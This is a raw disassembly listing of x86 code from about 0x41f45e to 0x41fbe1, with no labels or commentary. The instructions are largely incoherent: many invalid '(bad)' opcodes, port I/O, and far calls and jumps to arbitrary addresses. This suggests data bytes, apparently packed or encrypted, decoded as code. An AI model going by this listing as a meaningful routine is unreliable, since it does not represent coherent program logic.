  41f45e:	lods   eax,DWORD PTR ds:[esi]
  41f45f:	(bad)  
  41f460:	push   eax
  41f461:	xor    DWORD PTR [ebx-0x4f1ba39],0x20f8209e
  41f46b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f46c:	scas   al,BYTE PTR es:[edi]
  41f46d:	push   edi
  41f46e:	inc    edi
  41f46f:	shl    DWORD PTR [ecx+edi*4+0x81c1143],cl
  41f476:	push   es
  41f477:	gs in  al,0x86
  41f47a:	test   DWORD PTR [eax],ebx
  41f47c:	sbb    eax,0x46b8c605
  41f481:	or     ah,BYTE PTR [eax+eax*2]
  41f484:	mov    dh,0x10
  41f486:	sub    eax,0x4ae2ca
  41f48b:	aam    0xc6
  41f48d:	mov    ah,0x14
  41f48f:	cli    
  41f490:	mov    eax,ds:0xf6955fdc
  41f495:	pop    edx
  41f496:	rcr    BYTE PTR [ecx+0x7b],0x3
  41f49a:	fsubp  st(3),st
  41f49c:	pop    edi
  41f49d:	jne    0x41f497
  41f49f:	jno    0x41f472
  41f4a1:	xchg   edi,eax
  41f4a2:	ror    DWORD PTR [edi+0x13],1
  41f4a5:	outs   dx,DWORD PTR ds:[esi]
  41f4a6:	adc    esi,ebx
  41f4a8:	das    
  41f4a9:	test   BYTE PTR [esi-0x3e],ah
  41f4ac:	mov    edi,0x22681f8d
  41f4b1:	xchg   esi,edi
  41f4b3:	sub    DWORD PTR [esi+0x3c],edi
  41f4b6:	outs   dx,BYTE PTR ds:[esi]
  41f4b7:	scas   al,BYTE PTR es:[edi]
  41f4b8:	call   0xcef2c204
  41f4bd:	scas   eax,DWORD PTR es:[edi]
  41f4be:	sbb    ebx,ebx
  41f4c0:	loopne 0x41f50b
  41f4c2:	mov    esi,0x930b1339
  41f4c7:	mov    esi,0xc82d889a
  41f4cc:	pop    ebp
  41f4cd:	push   ss
  41f4ce:	in     eax,dx
  41f4cf:	repz and eax,0x7726731c
  41f4d5:	pop    esp
  41f4d6:	movsx  ebx,cl
  41f4d9:	aad    0x38
  41f4db:	sub    eax,0x78df2c
  41f4e0:	mov    DWORD PTR [ebx+ecx*1-0x34b55587],ebp
  41f4e7:	retf   
  41f4e8:	rcr    BYTE PTR [ecx-0x11a4485c],cl
  41f4ee:	mov    DWORD PTR [edi],ebp
  41f4f0:	pop    esp
  41f4f1:	adc    ch,BYTE PTR [ecx+0x2a]
  41f4f4:	mov    ax,ds:0x5ea246ca
  41f4fa:	dec    esp
  41f4fb:	xor    ebx,DWORD PTR [ebp-0x7ed9cbcf]
  41f501:	ins    BYTE PTR es:[edi],dx
  41f502:	cmp    ebx,DWORD PTR [edx-0x1]
  41f505:	sub    dh,BYTE PTR [eax]
  41f507:	into   
  41f508:	push   eax
  41f509:	mov    ch,0x22
  41f50b:	std    
  41f50c:	or     esi,DWORD PTR [ecx]
  41f50e:	outs   dx,BYTE PTR ds:[esi]
  41f50f:	xchg   esi,eax
  41f510:	shl    ebp,0x79
  41f513:	es push edi
  41f515:	push   edx
  41f516:	inc    esi
  41f517:	sbb    ah,0x99
  41f51a:	push   eax
  41f51b:	daa    
  41f51c:	or     ah,BYTE PTR [ebx+ebx*8]
  41f51f:	mov    dh,0x9b
  41f521:	ins    BYTE PTR es:[edi],dx
  41f522:	cmp    al,0xe9
  41f524:	mov    ds,esp
  41f526:	inc    esi
  41f527:	dec    esi
  41f528:	mov    bh,0x63
  41f52a:	mov    eax,esp
  41f52c:	push   es
  41f52d:	sbb    edi,DWORD PTR [esi+ebx*1-0x16d7ed06]
  41f534:	sub    edi,DWORD PTR [edx-0x62]
  41f537:	fcomip st,st(0)
  41f539:	sub    DWORD PTR [eax+0x5783594e],esi
  41f53f:	mov    al,0x1d
  41f541:	int3   
  41f542:	xchg   ebx,eax
  41f543:	out    0x46,al
  41f545:	sbb    ch,BYTE PTR [eax-0x1a]
  41f548:	fst    QWORD PTR [ebx+0x11]
  41f54b:	neg    DWORD PTR [esi+0x60]
  41f54e:	(bad)  
  41f54f:	mov    ebp,0xfeae6332
  41f554:	int3   
  41f555:	dec    esp
  41f556:	pop    esi
  41f557:	daa    
  41f558:	aaa    
  41f559:	(bad)  
  41f55a:	int3   
  41f55b:	sbb    BYTE PTR [esi+ebx*2+0x257034bf],bh
  41f562:	inc    ebx
  41f563:	es push eax
  41f565:	pop    esp
  41f566:	ror    BYTE PTR ds:0x75e3faeb,1
  41f56c:	inc    ecx
  41f56d:	sti    
  41f56e:	lock mov al,ds:0x3037aac9
  41f574:	pusha  
  41f575:	les    esp,FWORD PTR [edx]
  41f577:	xchg   DWORD PTR [ecx-0x53],ecx
  41f57a:	aas    
  41f57b:	dec    ebx
  41f57c:	nop
  41f57d:	adc    dh,BYTE PTR ds:0xac84e48c
  41f583:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f584:	add    eax,0xc3afee52
  41f589:	jmp    0xa162f064
  41f58e:	stos   DWORD PTR es:[edi],eax
  41f58f:	push   ebx
  41f590:	(bad)  
  41f591:	sbb    ebx,DWORD PTR [eax+0x78]
  41f594:	cmp    eax,0x235f709f
  41f599:	clc    
  41f59a:	pop    es
  41f59b:	mov    eax,ds:0x7b0993a0
  41f5a0:	sub    al,0x8f
  41f5a2:	mov    eax,0xe350b10
  41f5a7:	cmp    esi,DWORD PTR ds:0x5543f229
  41f5ad:	imul   edi,DWORD PTR [esi+0x28814dfb],0xd040aecd
  41f5b7:	xor    al,0xd3
  41f5b9:	clc    
  41f5ba:	fisubr WORD PTR [ebp+0x6a]
  41f5bd:	jno    0x41f55f
  41f5bf:	inc    edx
  41f5c0:	je     0x41f5f2
  41f5c2:	push   ebp
  41f5c3:	sbb    eax,0x18b11035
  41f5c8:	push   0x91f01459
  41f5cd:	jne    0x41f5de
  41f5cf:	idiv   DWORD PTR [ebp+0x75]
  41f5d2:	popf   
  41f5d3:	fstp   QWORD PTR [ebx-0x3f6e0bb1]
  41f5d9:	pop    ds
  41f5da:	arpl   WORD PTR [ebx],bx
  41f5dc:	or     DWORD PTR [esi+0x57a8406f],eax
  41f5e2:	call   0x74a47e96
  41f5e7:	sub    dl,cl
  41f5e9:	jne    0x41f57e
  41f5eb:	pop    esi
  41f5ec:	mov    ecx,0xd033d0c0
  41f5f1:	mov    ch,0x4d
  41f5f3:	xchg   edi,eax
  41f5f4:	mov    ebx,0x25d94ff3
  41f5f9:	std    
  41f5fa:	fnstcw WORD PTR [ebx-0x22d7235f]
  41f600:	aaa    
  41f601:	aas    
  41f602:	cmp    al,0x70
  41f604:	sbb    dh,dl
  41f606:	clc    
  41f607:	push   0x368cf3c8
  41f60c:	bnd ret 0x9894
  41f610:	icebp  
  41f611:	in     al,0x9e
  41f613:	jno    0x41f653
  41f615:	pop    ds
  41f616:	push   ecx
  41f617:	mov    esp,0x3afd0f52
  41f61c:	jno    0x41f5bb
  41f61e:	mov    eax,ds:0xef66ca00
  41f623:	jb     0x41f639
  41f625:	mov    eax,0x7b06c158
  41f62a:	mov    bh,0xc8
  41f62c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f62d:	dec    ebx
  41f62e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f62f:	sar    ebx,0x52
  41f632:	sub    esi,DWORD PTR [esi]
  41f634:	xchg   ebp,eax
  41f635:	push   edi
  41f636:	fidivr WORD PTR [ebp+0x4e]
  41f639:	cmp    al,0x2b
  41f63b:	adc    ebx,DWORD PTR [ebx+0xeda70de]
  41f641:	in     al,0x42
  41f643:	in     eax,dx
  41f644:	lods   al,BYTE PTR ds:[esi]
  41f645:	mov    WORD PTR [ebp-0x63d9a755],?
  41f64b:	iret   
  41f64c:	into   
  41f64d:	imul   esp,DWORD PTR [edx+0x4f661c8f],0x5e8e2eca
  41f657:	pop    edx
  41f658:	fst    DWORD PTR [ebp+0x3]
  41f65b:	ds repnz call 0x6d12:0x5d36863c
  41f664:	jmp    0x41f5ed
  41f666:	mov    ebp,0x22692db0
  41f66b:	mov    dh,0xb1
  41f66d:	outs   dx,DWORD PTR ds:[esi]
  41f66e:	das    
  41f66f:	dec    ebp
  41f670:	xor    DWORD PTR [ecx],edi
  41f672:	xchg   edx,eax
  41f673:	and    eax,0x3554048d
  41f678:	shl    WORD PTR [edx-0x3d],1
  41f67c:	sub    al,0x42
  41f67e:	pop    ds
  41f67f:	jp     0x41f6d7
  41f681:	out    dx,al
  41f682:	jb     0x41f678
  41f684:	jg     0x41f6f4
  41f686:	setne  BYTE PTR [ebp-0x5380d41a]
  41f68d:	lods   eax,DWORD PTR ds:[esi]
  41f68e:	mov    al,0x35
  41f690:	loopne 0x41f6aa
  41f692:	in     al,0x7a
  41f694:	jmp    0x41f6d4
  41f696:	jle    0x41f688
  41f698:	fwait
  41f699:	and    eax,0x48f300e7
  41f69e:	aad    0x37
  41f6a0:	fwait
  41f6a1:	in     eax,0x2c
  41f6a3:	xchg   ebx,eax
  41f6a4:	and    eax,0xaf18f5e7
  41f6a9:	call   0xefcf:0x48f7dd1
  41f6b0:	cmp    DWORD PTR [ecx-0x62],esi
  41f6b3:	mov    ds:0x9c285f55,eax
  41f6b8:	push   ds
  41f6b9:	dec    ebp
  41f6ba:	mov    dh,0x87
  41f6bc:	(bad)  
  41f6bd:	fs cli 
  41f6bf:	ins    DWORD PTR es:[edi],dx
  41f6c0:	dec    esp
  41f6c1:	(bad)  
  41f6c2:	or     ch,BYTE PTR ds:0xc747fbb8
  41f6c8:	test   BYTE PTR [edx-0x397789f1],ah
  41f6ce:	scas   al,BYTE PTR es:[edi]
  41f6cf:	jl     0x41f651
  41f6d1:	pop    edi
  41f6d2:	mov    eax,eax
  41f6d4:	push   eax
  41f6d5:	jns    0x41f6af
  41f6d7:	enter  0xb1db,0x17
  41f6db:	push   edx
  41f6dc:	cs dec ecx
  41f6de:	cld    
  41f6df:	sub    DWORD PTR ds:0xf10757c8,esi
  41f6e5:	add    eax,DWORD PTR [ecx-0x4be7cdf]
  41f6eb:	and    eax,0x17197d09
  41f6f0:	clc    
  41f6f1:	repz test BYTE PTR [edi],0x19
  41f6f5:	mov    cl,0x2a
  41f6f7:	mov    al,0xab
  41f6f9:	mov    al,ds:0xb913cde2
  41f6fe:	clc    
  41f6ff:	sbb    dh,BYTE PTR [esi-0x5c]
  41f702:	mov    bh,0x30
  41f704:	or     bh,ch
  41f706:	pop    edi
  41f707:	retf   0x64bd
  41f70a:	ret    0x128b
  41f70d:	(bad)  
  41f70f:	ret    
  41f710:	pushf  
  41f711:	cmp    eax,0xea6662d6
  41f716:	jp     0x41f717
  41f718:	fsubp  st(4),st
  41f71a:	mov    bh,0x7d
  41f71c:	(bad)  
  41f71d:	pop    ebp
  41f71e:	sub    DWORD PTR [eax-0x4b],eax
  41f721:	fstp   TBYTE PTR [esi]
  41f723:	das    
  41f724:	mov    edi,0xda7ad549
  41f729:	iret   
  41f72a:	mov    ds:0xb2482ac,al
  41f72f:	jae    0x41f6e1
  41f731:	dec    eax
  41f732:	sub    BYTE PTR [esi+0x2fc3d607],al
  41f738:	or     bh,BYTE PTR [ecx]
  41f73a:	jo     0x41f776
  41f73c:	or     ecx,eax
  41f73e:	popf   
  41f73f:	push   ebp
  41f740:	(bad)  
  41f741:	adc    bh,BYTE PTR [ebx]
  41f743:	mov    eax,0x888b3948
  41f748:	push   0xffffffbf
  41f74a:	xor    ah,0xa
  41f74d:	outs   dx,BYTE PTR ds:[esi]
  41f74e:	mov    cl,0xa
  41f750:	and    BYTE PTR [edi+esi*1-0x2d],ch
  41f754:	into   
  41f755:	mov    ds:0xc8ac302e,al
  41f75a:	or     eax,DWORD PTR ds:0xc1c919ee
  41f760:	stc    
  41f761:	push   ebp
  41f762:	jmp    0x1cef599d
  41f767:	ror    BYTE PTR [esi+0x2e9f7792],cl
  41f76d:	jg     0x41f7cd
  41f76f:	jns    0x41f759
  41f771:	ins    DWORD PTR es:[edi],dx
  41f772:	cmp    eax,0x59ad0dc
  41f777:	xchg   ebx,eax
  41f778:	lods   eax,DWORD PTR ds:[esi]
  41f779:	push   edi
  41f77a:	mov    esp,0xc4ed85fb
  41f77f:	or     BYTE PTR [edi+0xf],cl
  41f782:	mov    cl,0xff
  41f784:	and    bh,cl
  41f786:	sub    al,0x90
  41f788:	pop    esi
  41f789:	sub    eax,edx
  41f78b:	and    esi,esi
  41f78d:	jmp    0x41f7b6
  41f78f:	shl    BYTE PTR [ecx],0xa0
  41f792:	cmc    
  41f793:	pop    ss
  41f794:	pusha  
  41f795:	mov    BYTE PTR [edx],0xfc
  41f798:	xchg   edx,eax
  41f799:	out    0x7,al
  41f79b:	jl     0x41f812
  41f79d:	std    
  41f79e:	fild   WORD PTR [ebx]
  41f7a0:	clc    
  41f7a1:	dec    eax
  41f7a2:	and    al,BYTE PTR [ecx+0x478f6487]
  41f7a8:	outs   dx,DWORD PTR ds:[esi]
  41f7a9:	push   edx
  41f7aa:	add    esi,ecx
  41f7ac:	xor    ecx,0xfffffff3
  41f7af:	or     cl,0x42
  41f7b2:	shr    DWORD PTR [edi+ebp*1-0x3a],cl
  41f7b6:	test   BYTE PTR [eax],bh
  41f7b8:	outs   dx,BYTE PTR ds:[esi]
  41f7b9:	pop    ecx
  41f7ba:	mov    esp,0xc865ea91
  41f7bf:	pop    ebx
  41f7c0:	ins    BYTE PTR es:[edi],dx
  41f7c1:	xchg   esi,eax
  41f7c2:	xchg   edx,eax
  41f7c3:	into   
  41f7c4:	mov    esp,DWORD PTR [ebx*4+0x5c0e48e4]
  41f7cb:	repz sahf 
  41f7cd:	sub    eax,edi
  41f7cf:	sti    
  41f7d0:	dec    ebp
  41f7d1:	mov    esi,0x3e783f80
  41f7d6:	ins    DWORD PTR es:[edi],dx
  41f7d7:	adc    edi,DWORD PTR [ecx+0x27]
  41f7da:	lds    esi,FWORD PTR [edx-0x55]
  41f7dd:	jnp    0x41f7cd
  41f7df:	fbstp  TBYTE PTR [esi-0x313d7c6b]
  41f7e5:	cmp    al,0x17
  41f7e7:	mov    eax,ds:0x96c37ef6
  41f7ec:	mov    bh,0xee
  41f7ee:	call   0x74e40794
  41f7f3:	ins    DWORD PTR es:[edi],dx
  41f7f4:	or     DWORD PTR [edx-0x8],ecx
  41f7f7:	nop
  41f7f8:	loopne 0x41f82c
  41f7fa:	(bad)  
  41f7fb:	xor    eax,0x601ba39f
  41f800:	pop    ebp
  41f801:	retf   0xd818
  41f804:	add    DWORD PTR [esi-0x1e6bbf7d],esi
  41f80a:	mov    ebp,0xa2718d52
  41f80f:	aad    0x55
  41f811:	das    
  41f812:	ret    0x601d
  41f815:	jmp    0x4482:0x5ec552db
  41f81c:	inc    esi
  41f81d:	nop
  41f81e:	dec    eax
  41f81f:	xchg   ebp,eax
  41f820:	mov    ch,0x7f
  41f822:	pop    es
  41f823:	sar    DWORD PTR [esi-0x37],cl
  41f826:	xchg   ebx,eax
  41f827:	mul    DWORD PTR [esi]
  41f829:	mov    BYTE PTR [ecx],bh
  41f82b:	push   ecx
  41f82c:	xchg   ebp,eax
  41f82d:	dec    ebx
  41f82e:	pop    ss
  41f82f:	pop    edx
  41f830:	iret   
  41f831:	ret    
  41f832:	jb     0x41f856
  41f834:	xor    ecx,DWORD PTR [eax+0xd]
  41f837:	cmp    ecx,edx
  41f839:	repnz inc ecx
  41f83b:	mov    edx,0x310e4a81
  41f840:	xchg   ebx,eax
  41f841:	cmp    al,0x64
  41f843:	test   esp,edi
  41f845:	dec    edx
  41f846:	(bad)  
  41f847:	call   0x12f3ba22
  41f84c:	daa    
  41f84d:	mov    DWORD PTR [edx-0x747f7d98],esp
  41f853:	push   ebp
  41f854:	jmp    0xbd09:0xce699fab
  41f85b:	cld    
  41f85c:	dec    edx
  41f85d:	pop    ebp
  41f85e:	xor    DWORD PTR [ebx],0x33
  41f861:	popf   
  41f862:	xchg   ecx,esi
  41f864:	ss pop ss
  41f866:	xchg   ebp,eax
  41f867:	out    dx,eax
  41f868:	(bad)  
  41f86a:	mov    WORD PTR [edi-0x464c400],ss
  41f870:	mov    edx,0x90d52c48
  41f875:	jl     0x41f858
  41f877:	adc    DWORD PTR [ebx],ecx
  41f879:	jo     0x41f7fe
  41f87b:	sub    BYTE PTR ds:0x423351bf,dl
  41f881:	scas   al,BYTE PTR es:[edi]
  41f882:	push   0xffffff85
  41f884:	mov    edx,0x5fb8e74b
  41f889:	cwde   
  41f88a:	das    
  41f88b:	aad    0xaf
  41f88d:	mov    al,0xdf
  41f88f:	ret    0x47ea
  41f892:	sbb    eax,0x498c1c51
  41f897:	sbb    eax,0x916429c4
  41f89c:	pop    edi
  41f89d:	sbb    dh,BYTE PTR [eax+0xe]
  41f8a0:	mov    ch,BYTE PTR [edx-0x4cc4918b]
  41f8a6:	cmp    al,0x20
  41f8a8:	mov    cl,0xf2
  41f8aa:	cmp    al,0xd2
  41f8ac:	fistp  WORD PTR [esi+0x27]
  41f8af:	push   ss
  41f8b0:	xlat   BYTE PTR ds:[ebx]
  41f8b1:	adc    ebp,DWORD PTR [esi-0x14fc2f7a]
  41f8b7:	dec    ecx
  41f8b8:	cdq    
  41f8b9:	call   0x376c63e7
  41f8be:	mov    DWORD PTR [ebp+0xa3bfbc8],edi
  41f8c4:	mov    cl,0xba
  41f8c6:	jne    0x41f866
  41f8c8:	(bad)  
  41f8c9:	mov    ds:0xcc78fa2c,eax
  41f8ce:	js     0x41f888
  41f8d0:	mov    ds:0x9ac6056f,al
  41f8d5:	into   
  41f8d6:	jns    0x41f8b0
  41f8d8:	push   esi
  41f8d9:	xchg   esp,eax
  41f8da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8db:	cdq    
  41f8dc:	add    eax,0xcf579eeb
  41f8e1:	pop    esp
  41f8e2:	enter  0x11c1,0x7e
  41f8e6:	int    0xba
  41f8e8:	add    bh,cl
  41f8ea:	leave  
  41f8eb:	ja     0x41f949
  41f8ed:	mov    ecx,ss
  41f8ef:	in     al,0x37
  41f8f1:	js     0x41f8a1
  41f8f3:	dec    ecx
  41f8f4:	sub    BYTE PTR [ecx+0x5b],bh
  41f8f7:	cmp    dl,bl
  41f8f9:	jb     0x41f950
  41f8fb:	adc    esp,DWORD PTR [ebx+0x6aed9b1f]
  41f901:	shl    ecx,1
  41f903:	sbb    al,BYTE PTR [esi-0xa]
  41f906:	in     eax,dx
  41f907:	adc    ah,BYTE PTR [ebx]
  41f909:	ret    0xd0d9
  41f90c:	ss cmp al,0xa0
  41f90f:	push   ds
  41f910:	sub    eax,0x62974751
  41f915:	mov    BYTE PTR [ebx-0x4b],bh
  41f918:	dec    ecx
  41f919:	jb     0x41f97c
  41f91b:	mov    dl,0x1
  41f91d:	ins    BYTE PTR es:[edi],dx
  41f91e:	addr16 int 0xa6
  41f921:	aam    0x59
  41f923:	rcl    DWORD PTR [edi+ebx*2-0x63],0xa9
  41f928:	test   eax,0x45e5197c
  41f92d:	sbb    dh,BYTE PTR [esi+0x37]
  41f930:	mov    ah,ah
  41f932:	repz cld 
  41f934:	imul   ecx,esp,0xffffffe2
  41f937:	ins    DWORD PTR es:[edi],dx
  41f938:	sahf   
  41f939:	sub    al,0xde
  41f93b:	jns    0x41f8fd
  41f93d:	sub    esi,DWORD PTR ds:0xa0aa9743
  41f943:	inc    ebp
  41f944:	or     eax,0x35bc3238
  41f949:	mov    eax,0x9cfc3948
  41f94e:	push   0x91c6e403
  41f953:	into   
  41f954:	pop    ds
  41f955:	stc    
  41f956:	pop    es
  41f957:	retf   
  41f958:	loop   0x41f9c3
  41f95a:	bnd jnp 0x41f9cc
  41f95d:	or     ebp,ecx
  41f95f:	(bad)  
  41f960:	mov    cl,0x49
  41f962:	dec    edi
  41f963:	pop    esp
  41f964:	add    eax,0xf86a0f66
  41f969:	rcr    DWORD PTR [edi-0x43],0xe9
  41f96d:	pop    esp
  41f96e:	jl     0x41f9cf
  41f970:	sub    ah,BYTE PTR [ebp+0x5621220f]
  41f976:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f977:	xor    eax,0x1b28e302
  41f97c:	outs   dx,DWORD PTR ds:[esi]
  41f97d:	sbb    DWORD PTR [edi-0x52],esi
  41f980:	push   edi
  41f981:	aam    0xb0
  41f983:	dec    esp
  41f984:	test   esi,ebx
  41f986:	call   0xc225:0x21159cee
  41f98d:	ja     0x41f9ba
  41f98f:	inc    eax
  41f990:	xchg   ecx,eax
  41f991:	outs   dx,DWORD PTR ds:[esi]
  41f992:	or     eax,0xe93f20ed
  41f997:	fs jmp 0x41f9c6
  41f99a:	dec    ecx
  41f99b:	sbb    al,0x76
  41f99d:	mov    esp,DWORD PTR [ecx]
  41f99f:	pop    es
  41f9a0:	popa   
  41f9a1:	add    edi,eax
  41f9a3:	xor    BYTE PTR [edi],ch
  41f9a5:	or     dl,ah
  41f9a7:	or     eax,0xcdbd105f
  41f9ac:	sbb    ebx,edi
  41f9ae:	and    ah,bl
  41f9b0:	push   0x4937c559
  41f9b5:	xchg   ecx,eax
  41f9b6:	push   eax
  41f9b7:	mov    ecx,0xe2d90b05
  41f9bc:	mov    ds:0xb0be1bf4,al
  41f9c1:	sar    ch,1
  41f9c3:	push   ebp
  41f9c4:	mov    bh,0xb0
  41f9c6:	fdiv   st,st(3)
  41f9c8:	popf   
  41f9c9:	sub    DWORD PTR [ebp+0x2e],ebx
  41f9cc:	ja     0x41f9be
  41f9ce:	aaa    
  41f9cf:	push   es
  41f9d0:	shl    bh,cl
  41f9d2:	mov    dl,0xf
  41f9d4:	push   edi
  41f9d5:	lods   eax,DWORD PTR ds:[esi]
  41f9d6:	jmp    0xe7cf2ab3
  41f9db:	adc    bl,dh
  41f9dd:	inc    edx
  41f9de:	adc    dl,BYTE PTR [edi+eax*4+0x5043d3f3]
  41f9e5:	mov    BYTE PTR [ebp+edi*1+0x7a640b22],dl
  41f9ec:	lods   eax,DWORD PTR ds:[esi]
  41f9ed:	mov    ebp,0x7d12a911
  41f9f2:	in     al,0x1a
  41f9f4:	add    al,0x57
  41f9f6:	mov    ds:0x5e9e351d,al
  41f9fb:	push   ebp
  41f9fc:	ds ss push eax
  41f9ff:	push   ebp
  41fa00:	sub    eax,0x6089d19e
  41fa05:	mov    eax,0x236b3b3a
  41fa0a:	inc    ebp
  41fa0b:	inc    ebx
  41fa0c:	fimul  WORD PTR [edx]
  41fa0e:	cmp    BYTE PTR [ebp+0x74b3b430],bl
  41fa14:	in     eax,0x24
  41fa16:	jge    0x41fa23
  41fa18:	lds    ebp,FWORD PTR [ecx+0x3ca07cbd]
  41fa1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa1f:	addr16 aas 
  41fa21:	inc    edx
  41fa22:	dec    edx
  41fa23:	xor    al,0x1f
  41fa25:	xchg   edx,eax
  41fa26:	test   al,0x50
  41fa28:	popf   
  41fa29:	repnz pop ss
  41fa2b:	jg     0x41fa63
  41fa2d:	inc    eax
  41fa2e:	push   ecx
  41fa2f:	xor    cl,BYTE PTR [ecx]
  41fa31:	mov    esi,DWORD PTR [eax+0xc8df317]
  41fa37:	adc    ecx,DWORD PTR [ebp+0x6ce9980e]
  41fa3d:	stos   DWORD PTR es:[edi],eax
  41fa3e:	pop    esp
  41fa3f:	adc    al,0x55
  41fa41:	std    
  41fa42:	pop    esi
  41fa43:	jle    0x41fa6b
  41fa45:	xchg   ebp,eax
  41fa46:	lds    ecx,FWORD PTR [esi+0x38c2a870]
  41fa4c:	ja     0x41faa0
  41fa4e:	out    0xa7,eax
  41fa50:	dec    esi
  41fa51:	pop    eax
  41fa52:	test   BYTE PTR [eax],dh
  41fa54:	std    
  41fa55:	ret    
  41fa56:	mov    BYTE PTR [esi+0x6606b7f2],ah
  41fa5c:	rol    DWORD PTR [esi+0x7f67fdc3],0x66
  41fa63:	sub    DWORD PTR [ebp-0x70],edx
  41fa66:	mov    ds:0xae65d9b2,al
  41fa6b:	and    eax,0x35515e12
  41fa70:	cs mov bh,BYTE PTR gs:[edx-0x46878d9d]
  41fa78:	and    al,0xc8
  41fa7a:	arpl   WORD PTR [edi],di
  41fa7c:	cwde   
  41fa7d:	test   DWORD PTR [ecx+0x4fc78b9f],0x7cc00fc7
  41fa87:	push   eax
  41fa88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa89:	add    al,0x90
  41fa8b:	push   ecx
  41fa8c:	test   DWORD PTR [ebp-0xd],esi
  41fa8f:	pop    edx
  41fa90:	popa   
  41fa91:	adc    al,0xcc
  41fa93:	dec    eax
  41fa94:	push   ecx
  41fa95:	fs push esp
  41fa97:	(bad)  
  41fa98:	cmp    eax,0xabbf0fb1
  41fa9d:	fdivr  DWORD PTR [edi-0x28]
  41faa0:	xchg   ebx,eax
  41faa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41faa2:	inc    ecx
  41faa3:	adc    DWORD PTR ds:0x1ca11e44,ecx
  41faa9:	or     BYTE PTR [eax+eiz*8-0x49b5cee4],ah
  41fab0:	test   eax,0x2c45e658
  41fab5:	mov    esi,0xa5b2f350
  41faba:	pop    es
  41fabb:	push   ecx
  41fabc:	in     al,dx
  41fabd:	ror    BYTE PTR [eax],1
  41fabf:	aam    0xd4
  41fac1:	test   DWORD PTR [eax+0x424e067b],eax
  41fac7:	sti    
  41fac8:	dec    edx
  41fac9:	mov    cl,0x52
  41facb:	fst    DWORD PTR [ebp+0x50b8b669]
  41fad1:	add    eax,0xfa602988
  41fad6:	jns    0x41fafe
  41fad8:	daa    
  41fad9:	or     dl,cl
  41fadb:	pusha  
  41fadc:	(bad)  [ecx-0x3db6b9f4]
  41fae2:	or     al,BYTE PTR [ebx-0x34471099]
  41fae8:	out    0xee,eax
  41faea:	mov    BYTE PTR [edi],dl
  41faec:	sub    eax,0x4202e9f0
  41faf1:	retf   0x5bd8
  41faf4:	jmp    0x8ee3447b
  41faf9:	shr    DWORD PTR [edi+0x73],cl
  41fafc:	retf   0x8f10
  41faff:	sbb    DWORD PTR [eax-0xee0e3ce],esi
  41fb05:	cmp    bl,0x56
  41fb08:	mov    ebp,0x1d7a64e
  41fb0d:	inc    edi
  41fb0e:	test   DWORD PTR cs:[edi-0x36],eax
  41fb12:	sub    eax,0xbb24113f
  41fb17:	or     ah,BYTE PTR [edi-0x1b]
  41fb1a:	fs aas 
  41fb1c:	pop    ebp
  41fb1d:	fcmovnb st,st(6)
  41fb1f:	in     eax,dx
  41fb20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb21:	and    BYTE PTR ds:0xe3c02585,0xec
  41fb28:	fisub  WORD PTR [edx+edx*1]
  41fb2b:	lods   al,BYTE PTR ds:[esi]
  41fb2c:	cwde   
  41fb2d:	xor    al,0x99
  41fb2f:	and    dh,BYTE PTR [ebx+0x3d]
  41fb32:	xchg   cl,cl
  41fb34:	test   bl,bl
  41fb36:	imul   ebp,DWORD PTR [edx+0x2d],0x6cff4ec
  41fb3d:	(bad)  
  41fb3e:	push   esp
  41fb3f:	ins    DWORD PTR es:[edi],dx
  41fb40:	ror    dh,1
  41fb42:	cmc    
  41fb43:	or     BYTE PTR [esi+0x2b],ch
  41fb46:	inc    ebp
  41fb47:	jo     0x41fb42
  41fb49:	cmp    al,cl
  41fb4b:	jb     0x41fb55
  41fb4d:	(bad)  
  41fb4f:	mov    eax,ds:0x84235758
  41fb54:	dec    ecx
  41fb55:	xchg   edi,eax
  41fb56:	inc    ebp
  41fb57:	adc    dh,ah
  41fb59:	jbe    0x41fbb2
  41fb5b:	mov    ecx,0x511bc541
  41fb60:	mov    al,ds:0xbd82e93e
  41fb65:	cmp    BYTE PTR [edi+0x3a],cl
  41fb68:	(bad)  
  41fb6a:	jge    0x41fbaa
  41fb6c:	pop    eax
  41fb6d:	into   
  41fb6e:	jbe    0x41fbde
  41fb70:	out    0x8c,eax
  41fb72:	pop    ss
  41fb73:	loop   0x41fbd5
  41fb75:	imul   ebp,esp,0x4534f9ab
  41fb7b:	imul   ebx,DWORD PTR [ecx],0x94cfae2d
  41fb81:	repz xor esi,DWORD PTR [edx]
  41fb84:	into   
  41fb85:	fs jns 0x41fbbb
  41fb88:	rol    DWORD PTR [esi],cl
  41fb8a:	mov    edx,0xd08c0cda
  41fb8f:	and    al,0xcc
  41fb91:	adc    al,al
  41fb93:	push   ebp
  41fb94:	addr16 add ebx,DWORD PTR [bp+si-0x29f8]
  41fb9a:	adc    DWORD PTR [ebp+0x6afbcd54],esi
  41fba0:	and    BYTE PTR [esi],0xaf
  41fba3:	xor    edx,esp
  41fba5:	daa    
  41fba6:	inc    ebp
  41fba7:	jg     0x41fb6e
  41fba9:	(bad)  
  41fbab:	push   ecx
  41fbac:	sbb    DWORD PTR [ecx+0x37],edx
  41fbaf:	arpl   WORD PTR [eax],ax
  41fbb1:	icebp  
  41fbb2:	mov    esp,0xed6aa5c9
  41fbb7:	dec    esp
  41fbb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbb9:	xor    DWORD PTR [edx+esi*1],ecx
  41fbbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbbd:	in     eax,dx
  41fbbe:	pop    esp
  41fbbf:	sbb    BYTE PTR [edi+0x6e10f264],al
  41fbc5:	stos   DWORD PTR es:[edi],eax
  41fbc6:	cmp    ebp,DWORD PTR [edx-0xb]
  41fbc9:	stc    
  41fbca:	mov    WORD PTR [ebx-0x21bee42b],?
  41fbd0:	jno    0x41fb52
  41fbd2:	jns    0x41fbb0
  41fbd4:	mov    cl,BYTE PTR [ebp+ebp*8+0x6e3645db]
  41fbdb:	adc    eax,0xc4d0c579
  41fbe0:	dec    ebp
  41fbe1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
